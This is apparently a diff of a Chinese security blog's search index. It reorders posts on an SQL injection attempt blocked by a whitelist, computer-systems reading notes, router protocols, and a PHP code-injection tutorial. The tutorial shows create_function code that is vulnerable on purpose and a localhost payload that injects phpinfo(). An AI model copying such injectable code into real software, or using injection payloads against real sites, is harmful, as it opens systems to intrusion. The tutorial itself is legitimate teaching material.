然后mybatis从queryInfo中获取到orderBy的值，然后拼接到sql语句中，注入完成，于是我就试了下，然后就报错了。。。。。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/6ed045dfdeee0302e085577626fa6481.png" alt="在这里插入图片描述"></p>
-<p>哦豁，白名单，完蛋。到这里基本上就失败了，不过我们还要去看一看怎么拦的，这里报错注意到是在<code>QueryParser</code>解析的时候限制了白名单，最后定位到这里<br><img src="https://i-blog.csdnimg.cn/blog_migrate/791ada2e53ee84118d82feb21c5eb9b0.png" alt="在这里插入图片描述"><br>跟进去<br><img src="https://i-blog.csdnimg.cn/blog_migrate/3768c9c3ce96f2e60702fe9c3fe0c8dd.png" alt="在这里插入图片描述"><br>继续到parse函数最后一行<br><img src="https://i-blog.csdnimg.cn/blog_migrate/4e6fda6669c7b46c6f08dfdf4aebf804.png" alt="在这里插入图片描述"><br>跟进<code>parseOrderBy</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/99806a2b16e0e7ea3777e19f7029ae2f.png" alt="在这里插入图片描述"><br>他妈的，我一眼就注意到这里的<code>preventInjection</code>，进去看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aa41d49a6862016da9fcd45c4a4784b8.png" alt="在这里插入图片描述"><br>。。。。根源在这里</p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-        <category>代码审计</category>
-      </categories>
-      <tags>
-        <tag>代码审计</tag>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -2389,29 +2394,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>深入理解计算机系统读书笔记（一）</title>
-    <url>/archives/84d33ff8.html</url>
-    <content><![CDATA[<ul>
-<li>一个程序从文件到执行要经过这些过程：<br>源程序经过预处理器将声明的头部文件导入到程序中生成一个文本文件一般以.i结尾，然后经过编译器编译成汇编程序，一般以.s结尾，然后经过汇编器翻译成机器指令生成可重定位目标程序，此程序是一个二进制文件，然后经过链接器链接程序中使用的链接库函数最终生成一个可执行目标文件，最终该可执行文件被加载到内存中由系统执行。</li>
-<li>适配器一般是插在主板卡槽中的一块卡，控制器一般是集成在IO设备上的核心控制芯片</li>
-<li></li>
-<li>虚拟内存结构：最上层空间为操作系统内核内存，向下依次为用户栈、共享库映射区域、运行时堆、程序代码和数据。</li>
-<li>多核超线程：多核-多个CPU内核，超线程，单个CPU内核中能同时执行多个控制流，在core i7中单核可以同时执行两个控制流，这也就解释了我的一个疑惑，当初在编译linux内核的是有执行make -j number 为什么number会是系统内核数量的2倍，原来根源在这儿，果然看书能更增加人的知识面。该功能是通过在单个内核中备份某些硬件来实现的，如备份程序计数器（PC）及寄存器文件。</li>
-<li>指令级并行，现代处理器可以同时执行多条指令的属性称为指令级并行</li>
-<li>时钟周期，完成一轮0、1切换花费的时间，上网查的，不一定准确。</li>
-<li>超标量处理器：一个周期可以执行超过一条指令的处理器</li>
-<li>操作系统内核是应用程序与硬件的媒介，它提供三个基本抽象，文件时对系统I&#x2F;O设备的抽象，虚拟内存是对主存和磁盘的抽象，进程是对处理器、主存、I&#x2F;O设备的抽象，虚拟机是对操作系统、处理器、主存和I&#x2F;O设备的抽象。</li>
-<li>amdahl定律描述了对系统某一部分进行功能升级对整体性能的影响。其主要思想是在对系统的某个部分进行加速时，其对系统整体性能的影响取决于给部分的重要性与加速程度。如果系统原来的运行时间为T1，假设某部分所需的执行时间占系统运行时间的a，这部分性能提升了k倍，那么不难得出新系统的整体运行时间T2&#x3D;(1-a)T1+(aT1)&#x2F;k，加速时间比S&#x3D;T1&#x2F;T2&#x3D;1&#x2F;((1-a)+a&#x2F;k)。考虑极端的情况当k无限趋近于无穷大的时候S&#x3D;1&#x2F;(1-a)，系统整体的性能提升程度取决于该部分的重要程度，该结论通过简单的思考其实也并不难以得出。<br>-对于一个4字节表示的32为无符号整数来说，其在内存中的存储可采取大端法与小端法两种方式，大端法即字节高位在前，小端法即字节低位在前，比如此处有内存地址0x100 0x101 0x102 0x103，那么采用大端法对于整数0x01234567的存储顺序为01 23 45 67 对于小端法存储顺序为67 45 23 01，当然采用哪一种存储方式往往是没有什么影响的，但是当微处理器固定下来后，数据的存储方式也就被固定了，当然也存在有支持双端法的处理器，由用户来选择使用哪一种存储顺序，当然具体采用那种存储顺序还取决于操作系统支持的存储方式，例如andriod就只支持小端的存储顺序。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>读书笔记</category>
-      </categories>
-      <tags>
-        <tag>深入理解计算机系统</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>深入剖析Log4j2调用流程</title>
     <url>/archives/a60aa68e.html</url>
     <content><![CDATA[<p>@<a href="%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90Log4j2%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B">TOC</a></p>
@@ -2436,19 +2418,19 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>深入理解计算机系统读书笔记（二）</title>
-    <url>/archives/b4c5d320.html</url>
+    <title>深入理解计算机系统读书笔记（一）</title>
+    <url>/archives/84d33ff8.html</url>
     <content><![CDATA[<ul>
-<li>数据的表示，无符号数一位就是一个数，有符号数采用补码的形式表示，最高位为负权，当最高位为1时其权重为-x(2**（w-1))，w为位数，x为最高位的取值。于是乎一个有符号数的补码表示就成了所有正权与负权之和。</li>
-<li>一个整数能被二进制方式表示，其根源在于其编码方式的唯一性，即双射，解释就是一个数在编码后有唯一的一个二进制格式与之对应，而这个二进制排列顺序在转换为整数后也有且仅有一个数与之对应。就想数学里的反函数一样。</li>
-<li>原码表示有符号数通过最高位作为符号位，如果最高位为1，则剩下的位取负权，如果最高位为0，则剩下的位取政权</li>
-<li>反码表示有符号数，最高位的权重为-x.(2**(2-1)-1) x为最高位的取值</li>
-<li>整数类型的强制类型转换，将一个无符号数转换为有符号数时二进制位的数据不变，变的只是解释这些位的方式。</li>
-<li>一个规律：一个4位有符号数-1，其强转为无符号数之后为15，注意到1+15 &#x3D; 16 &#x3D; 2*<em>4。这样就能很方便得进行负数有符号数转为无符号数，当然正数两种表示方式的结果都一样，当然一切都建立在有符号数使用补码表示。其原理为，最高位权重，对于一个4位表示的整数， 当使用补码时，最高位为1时权重为-8，使用无符号数时其权重为8，两者之间差了2</em>***4 &#x3D; 16。</li>
-<li>将无符号数转换为有符号数的时候，当无符号数小于等于有符号数的最大值的时候保持不变，当无符号数大于有符号数的最大值的时候，转换后的值为U-2**w，U为当前无符号数，w二进制位数。</li>
-<li>无符号数的长度扩展是零扩展，即大端法表示在左侧填充0，对于有符号数则是符号填充，负数填充1，正数填充0</li>
-<li>在将一个长度较小的有符号数变成无符号长度较大的数的时候，是先进行符号填充再进行符号转换的，如果顺序错了将产生完全不一样的结果。</li>
-<li>当一个有符号数与无符号数进行运算时会发生隐式类型转换，项范围更广的值转换。这个过程是非直观的，往往会导致很多预料之外的结果。</li>
+<li>一个程序从文件到执行要经过这些过程：<br>源程序经过预处理器将声明的头部文件导入到程序中生成一个文本文件一般以.i结尾，然后经过编译器编译成汇编程序，一般以.s结尾，然后经过汇编器翻译成机器指令生成可重定位目标程序，此程序是一个二进制文件，然后经过链接器链接程序中使用的链接库函数最终生成一个可执行目标文件，最终该可执行文件被加载到内存中由系统执行。</li>
+<li>适配器一般是插在主板卡槽中的一块卡，控制器一般是集成在IO设备上的核心控制芯片</li>
+<li></li>
+<li>虚拟内存结构：最上层空间为操作系统内核内存，向下依次为用户栈、共享库映射区域、运行时堆、程序代码和数据。</li>
+<li>多核超线程：多核-多个CPU内核，超线程，单个CPU内核中能同时执行多个控制流，在core i7中单核可以同时执行两个控制流，这也就解释了我的一个疑惑，当初在编译linux内核的是有执行make -j number 为什么number会是系统内核数量的2倍，原来根源在这儿，果然看书能更增加人的知识面。该功能是通过在单个内核中备份某些硬件来实现的，如备份程序计数器（PC）及寄存器文件。</li>
+<li>指令级并行，现代处理器可以同时执行多条指令的属性称为指令级并行</li>
+<li>时钟周期，完成一轮0、1切换花费的时间，上网查的，不一定准确。</li>
+<li>超标量处理器：一个周期可以执行超过一条指令的处理器</li>
+<li>操作系统内核是应用程序与硬件的媒介，它提供三个基本抽象，文件时对系统I&#x2F;O设备的抽象，虚拟内存是对主存和磁盘的抽象，进程是对处理器、主存、I&#x2F;O设备的抽象，虚拟机是对操作系统、处理器、主存和I&#x2F;O设备的抽象。</li>
+<li>amdahl定律描述了对系统某一部分进行功能升级对整体性能的影响。其主要思想是在对系统的某个部分进行加速时，其对系统整体性能的影响取决于给部分的重要性与加速程度。如果系统原来的运行时间为T1，假设某部分所需的执行时间占系统运行时间的a，这部分性能提升了k倍，那么不难得出新系统的整体运行时间T2&#x3D;(1-a)T1+(aT1)&#x2F;k，加速时间比S&#x3D;T1&#x2F;T2&#x3D;1&#x2F;((1-a)+a&#x2F;k)。考虑极端的情况当k无限趋近于无穷大的时候S&#x3D;1&#x2F;(1-a)，系统整体的性能提升程度取决于该部分的重要程度，该结论通过简单的思考其实也并不难以得出。<br>-对于一个4字节表示的32为无符号整数来说，其在内存中的存储可采取大端法与小端法两种方式，大端法即字节高位在前，小端法即字节低位在前，比如此处有内存地址0x100 0x101 0x102 0x103，那么采用大端法对于整数0x01234567的存储顺序为01 23 45 67 对于小端法存储顺序为67 45 23 01，当然采用哪一种存储方式往往是没有什么影响的，但是当微处理器固定下来后，数据的存储方式也就被固定了，当然也存在有支持双端法的处理器，由用户来选择使用哪一种存储顺序，当然具体采用那种存储顺序还取决于操作系统支持的存储方式，例如andriod就只支持小端的存储顺序。</li>
 </ul>
 ]]></content>
       <categories>
@@ -2479,6 +2461,29 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
 <li>有符号数的除法。对于有符号数在进行除法操作时因为移位会导致符号位为1时被填充为0，那么结果的符号就变化了，而我们知道除法运算是不是改变符号的，这与事实不符，所以简单的逻辑移位是不对的，这时候需要用到算术移位，当然了，补码正数的运算方法还是和无符号数一样的。所谓算术唯一就是右移的时候高位不是填充0而是填充1，如-5[1011]除以2得到-3，通过移位为[11011]舍去低位得到-3[1101]，这个推导过程我没看懂这儿就不写了。</li>
 <li>浮点数的二进制表示3&#x2F;4&#x3D;1&#x2F;4+2&#x2F;4&#x3D;1&#x2F;4+1&#x2F;2&#x3D;2**(-1)+2**(-2) &#x3D; 0.11 ，不过这种方式不便于表示大数，数据较大的时候会导致存储数据消耗巨大的存储空间，所以有了IEEE标准的浮点数表示方法，对于单精度浮点数用32位表示1个符号位，8个阶码，23个位数位，数按进度浮点数用64位表示，一个符号位，11个阶码，52个尾数。符号位1表示负数0表示正数，阶码有三种格式中时不包含全是0与全是1的规格化值，一种是全是0的非规格话的值，另一种是全是1的无穷大的值。当使用规格化的值的时候，位级表示&#x3D;浮点数的指数尾数（阶码）+偏置值，这个偏置值对于单精度浮点数来说为127，对双精度来说为1023，所以对单精度来说最多可以表示的指数位为-126~127，双精度为-1022 ~ 1023。尾数这部分怎么计算的我还没看明白。对于特殊值的阶码来说，当小数位全为0的时候表示无求大，正无穷还是负无穷由符号位控制。对于非规格化阶码，其提供了0的表示方法，因为规格化的表示尾数必须大于1，则不可能表示0，同样的这种方式表示的0的符号由符号位控制也就是产生了正0与负0两种结果，这两种结果在有些情况下相等在有些情况下不相等。</li>
 <li></li>
+</ul>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+      </categories>
+      <tags>
+        <tag>深入理解计算机系统</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>深入理解计算机系统读书笔记（二）</title>
+    <url>/archives/b4c5d320.html</url>
+    <content><![CDATA[<ul>
+<li>数据的表示，无符号数一位就是一个数，有符号数采用补码的形式表示，最高位为负权，当最高位为1时其权重为-x(2**（w-1))，w为位数，x为最高位的取值。于是乎一个有符号数的补码表示就成了所有正权与负权之和。</li>
+<li>一个整数能被二进制方式表示，其根源在于其编码方式的唯一性，即双射，解释就是一个数在编码后有唯一的一个二进制格式与之对应，而这个二进制排列顺序在转换为整数后也有且仅有一个数与之对应。就想数学里的反函数一样。</li>
+<li>原码表示有符号数通过最高位作为符号位，如果最高位为1，则剩下的位取负权，如果最高位为0，则剩下的位取政权</li>
+<li>反码表示有符号数，最高位的权重为-x.(2**(2-1)-1) x为最高位的取值</li>
+<li>整数类型的强制类型转换，将一个无符号数转换为有符号数时二进制位的数据不变，变的只是解释这些位的方式。</li>
+<li>一个规律：一个4位有符号数-1，其强转为无符号数之后为15，注意到1+15 &#x3D; 16 &#x3D; 2*<em>4。这样就能很方便得进行负数有符号数转为无符号数，当然正数两种表示方式的结果都一样，当然一切都建立在有符号数使用补码表示。其原理为，最高位权重，对于一个4位表示的整数， 当使用补码时，最高位为1时权重为-8，使用无符号数时其权重为8，两者之间差了2</em>***4 &#x3D; 16。</li>
+<li>将无符号数转换为有符号数的时候，当无符号数小于等于有符号数的最大值的时候保持不变，当无符号数大于有符号数的最大值的时候，转换后的值为U-2**w，U为当前无符号数，w二进制位数。</li>
+<li>无符号数的长度扩展是零扩展，即大端法表示在左侧填充0，对于有符号数则是符号填充，负数填充1，正数填充0</li>
+<li>在将一个长度较小的有符号数变成无符号长度较大的数的时候，是先进行符号填充再进行符号转换的，如果顺序错了将产生完全不一样的结果。</li>
+<li>当一个有符号数与无符号数进行运算时会发生隐式类型转换，项范围更广的值转换。这个过程是非直观的，往往会导致很多预料之外的结果。</li>
 </ul>
 ]]></content>
       <categories>
@@ -2614,6 +2619,46 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
+    <title>PHP代码执行</title>
+    <url>/archives/d5b96b72.html</url>
+    <content><![CDATA[<h1 id="PHP-CODE-INJECTION"><a href="#PHP-CODE-INJECTION" class="headerlink" title="PHP CODE INJECTION"></a>PHP CODE INJECTION</h1><p>可以注入PHP代码直接执行的漏洞</p>
+<p>一般都是后台使用了eval 函数，将我们的输入直接作为eval函数的参数，从而是的恶意的命令被执行</p>
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>create会创建一个匿名函数，第一个参数是传入的参数，第二个参数是函数体</p>
+<p><code>create_function(args,code)</code> 返回回个函数名字符串</p>
+<p>如</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span></span><br></pre></td></tr></table></figure>
+
+<p>函数的执行过程</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>**案例一：**漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">	<span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">	<span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">	<span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">usort</span>(<span class="variable">$databases</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test1.php?sort_by=%27%22]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+
+<p>还原执行过程</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> <span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
+
+<p>匿名函数执行</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> &#x27;&quot;</span>]);&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*	</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p><code>call_user_func(yourfunc,yourargs)</code> &#x2F;&#x2F;将参数传入函数，可传多个</p>
+<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h2><p><code>call_user_func_array(yourfunc,yourargsarray)</code> &#x2F;&#x2F;将索引数组的元素作为函数的参数</p>
+<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>array_map</p>
+<p>array_filter</p>
+<p>array_walk</p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+        <tag>PHP</tag>
+        <tag>代码执行</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>PHP命令执行</title>
     <url>/archives/96914696.html</url>
     <content><![CDATA[<h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><p>服务器提供了执行有限命令的权限，但是没有对用户上传的参数做严格过滤，于是可通过一些手段执行多条命令</p>
@@ -2673,46 +2718,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
         <tag>漏洞原理</tag>
         <tag>PHP</tag>
         <tag>命令执行</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP代码执行</title>
-    <url>/archives/d5b96b72.html</url>
-    <content><![CDATA[<h1 id="PHP-CODE-INJECTION"><a href="#PHP-CODE-INJECTION" class="headerlink" title="PHP CODE INJECTION"></a>PHP CODE INJECTION</h1><p>可以注入PHP代码直接执行的漏洞</p>
-<p>一般都是后台使用了eval 函数，将我们的输入直接作为eval函数的参数，从而是的恶意的命令被执行</p>
-<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>create会创建一个匿名函数，第一个参数是传入的参数，第二个参数是函数体</p>
-<p><code>create_function(args,code)</code> 返回回个函数名字符串</p>
-<p>如</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span></span><br></pre></td></tr></table></figure>
-
-<p>函数的执行过程</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>**案例一：**漏洞代码</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">	<span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">	<span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">	<span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">usort</span>(<span class="variable">$databases</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>payload</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test1.php?sort_by=%27%22]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
-
-<p>还原执行过程</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> <span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>
-
-<p>匿名函数执行</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> &#x27;&quot;</span>]);&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*	</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p><code>call_user_func(yourfunc,yourargs)</code> &#x2F;&#x2F;将参数传入函数，可传多个</p>
-<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h2><p><code>call_user_func_array(yourfunc,yourargsarray)</code> &#x2F;&#x2F;将索引数组的元素作为函数的参数</p>
-<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>array_map</p>
-<p>array_filter</p>
-<p>array_walk</p>
-]]></content>
-      <categories>
-        <category>漏洞原理</category>
-      </categories>
-      <tags>
-        <tag>漏洞原理</tag>
-        <tag>PHP</tag>
-        <tag>代码执行</tag>
       </tags>
   </entry>
   <entry>
@@ -3165,45 +3170,6 @@ sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class<?>[
       </tags>
   </entry>
   <entry>
-    <title>HRSP-浮动路由-RIP-ACL-IPsec</title>
-    <url>/archives/db738475.html</url>
-    <content><![CDATA[<h1 id="配置HSRP"><a href="#配置HSRP" class="headerlink" title="配置HSRP"></a>配置HSRP</h1><p>R1(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R1(config-if)#standby 1 ip 虚拟ip地址<br>R1(config-if)#standby 1 priority 100<br>R1(config-if)# standby 1 preempt  &#x2F;&#x2F;配置占先权<br>R1(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间 同一hsrp组的时间应一致<br>R1(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R1(config)# spanning-tree vlan 10 root primary<br>R1(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>R2(config)#int f0&#x2F;0 &#x2F;&#x2F;内网端口<br>R2(config-if)#standby 1 ip 虚拟ip地址<br>R2(config-if)#standby 1 priority 195 &#x2F;&#x2F;0-255<br>R2(config-if)# standby 1 preempt &#x2F;&#x2F;设置活跃路由器得占先权，由于从较低优先级别得路由器中取回转发全，回复活跃路由器的角色<br>R2(config-if)# standby 1 times 2 8 &#x2F;&#x2F;hello间隔与保持时间<br>R2(config-if)# standby 1 track f0&#x2F;1 100 &#x2F;&#x2F;配置端口跟踪<br>R2(config)# spanning-tree vlan 10 root primary<br>R2(config)# spanning-tree vlan 20 root secondary &#x2F;&#x2F;配置生成树实现负载均衡vlan 20走备份路由<br>优先级高的路由其作为主路由，优先级低的路由作为备份路由，当主路由发生故障的时候，备份路由由监听状态切换到活跃状态。当优先级相同时，比较端口ip,ip较大的作为活跃路由，如果优先级低的路由<br>已经成为了活跃路由，那么优先级高的路由将作为监听路由，直到活跃路由发生故障。值愈大优先级越高</p>
-<h2 id="hsrp协议组中由6种状态："><a href="#hsrp协议组中由6种状态：" class="headerlink" title="hsrp协议组中由6种状态："></a>hsrp协议组中由6种状态：</h2><p>初始状态：路由器刚启动时，或者配置发生改变时<br>学习状态：路由其等待来自活跃路由器的消息，此时路由器还没有收到来自活跃里尤其的hello消息，也没有学习到虚拟路由器的ip地址<br>监听状态：路由其学习了虚拟的ip地址，但他既不是活跃路由器也不是监听路由器，此时负责监听来自活跃路由器与备份路由器的hello包<br>发言状态：路由器周期性发送hello消息，并参与活跃路由器或者备份路由器的京选<br>备份状态：处于该状态的路由器时下一个活跃路由器的候选设备，其周期性得发送hello包<br>活跃状态：负责转发虚拟路由器得数据包，并周期性得发送hello消息。<br>hello间隔：3s<br>保持间隔10s<br>通产保持间隔要在hello间隔得3倍<br>使用udp协议</p>
-<h2 id="vrrp-虚拟路由冗余协议"><a href="#vrrp-虚拟路由冗余协议" class="headerlink" title="vrrp 虚拟路由冗余协议"></a>vrrp 虚拟路由冗余协议</h2><p>只有初始状态、活跃状态、备份状态三种状态<br>允许vrrp组得设备间建立认证机制</p>
-<h1 id="rip-距离矢量算法，根据跳数来选择路由"><a href="#rip-距离矢量算法，根据跳数来选择路由" class="headerlink" title="rip-距离矢量算法，根据跳数来选择路由"></a>rip-距离矢量算法，根据跳数来选择路由</h1><p>属于内部网关协议igp-有一系列协议族  还有一种时外部网关协议egp-只有一种协议<br>内部网关协议是往往是工作在一个组织实体里面的的路由器之间交换路由信息的协议，组织实体是指像学校、医院之类的实体<br>最大路由跳数为15跳，大于该值的路由被认为不可达</p>
-<p>当更新周期到达时，其向相邻的路由器发送学习到的路由。</p>
-<p>通过更行-update 与请求-requests两种分组来传输信息，更新周期为30s，如果不进行指定默认通过广播的形式更新信息。更新信息包括路由表与跳数两个部分。其并不是绝对根据跳数来选择路由的，同时也会参考网络的带宽。因为rip协议通过相邻路由器来更新路由表所以多网络全局的状况不清除，从而导致了一个慢收敛与不一致的问题。当三个火更多路由器构成环路是路由环路的问题仍会发生，这是需要用到触发更新法</p>
-<p>RIP的水平分割</p>
-<p>既路由器不向路径到来的方向回传此路径。通过将这些路由的跳数设置为16来实现该功能，能及时的解决路由环路的问题</p>
-<p>RIP的保持定时器法</p>
-<p>保持定时器可以防止路由器在路径从路由器从路由表中删除一定时间内（通常为180秒）接受新的路由信息。目的是为了保证每个路由器都收到路由不可达的信息，从而有效得避免了路由环路得产生。</p>
-<p>RIP的触发更新法</p>
-<p>当某个路径的跳数改变了路由器立即发生更新信息，不管路由器是否到达常规信息更新时间都发出更新信息。能够有效得加快路由的收敛时间</p>
-<p>收敛机制</p>
-<p><img src="/archives/db738475/QQ20210329085323.png"></p>
-<p>当主机与其直连路由器的链路发生中断时，其立刻向于其相邻的两个路由器发送路由更新信息，如果此时发送到右下路由器的信息发生堵塞延迟，则右上方的路由器先得到更新信息，将旧的到达主机的路由信息丢弃，右下方路由器因为没有收到来自左上路由器的更新信息，继续向右上路由器发送旧的路由信息，右上方路由器收到后又添加一条到达主机的路由。如此循环形成了路由环路。<br>使用udp协议的520端口</p>
-<p>RIP帧格式</p>
-<p><a href="RIP%E5%B8%A7%E6%A0%BC%E5%BC%8F%202019e93eb947495cbb98e4df2efa90c1.csv">RIP帧格式</a></p>
